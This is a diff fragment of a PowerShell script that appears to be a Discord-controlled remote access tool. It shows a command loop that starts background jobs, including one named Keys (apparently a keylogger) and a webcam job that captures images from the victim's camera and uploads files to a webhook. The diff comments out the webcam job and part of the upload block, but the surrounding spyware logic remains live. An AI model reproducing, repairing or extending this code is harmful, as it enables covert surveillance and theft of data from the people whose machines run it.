@@ -1431,10 +1431,10 @@ $screenJob = {
 #                $response = $wc.UploadFile($url, "POST", $sendfilePath)
 #                if ($WebcamWebhook){
 #                    $hooksend = $wc.UploadFile($WebcamWebhook, "POST", $sendfilePath)
-                }
-            }
-        }
-    }
+#                }
+#            }
+#        }
+#    }
 #    $imagePath = "$env:Temp\Image.jpg"
 #    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
 #    if (!($input)){$Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Image'} | select -First 1).Name}
@@ -1627,7 +1627,7 @@ while ($true) {
         $keysrunning = Get-Job -Name Keys
         if ($messages -eq 'webcam'){
             if (!($camrunning)){
-                Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
+            #    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
                 sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
             }
             else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
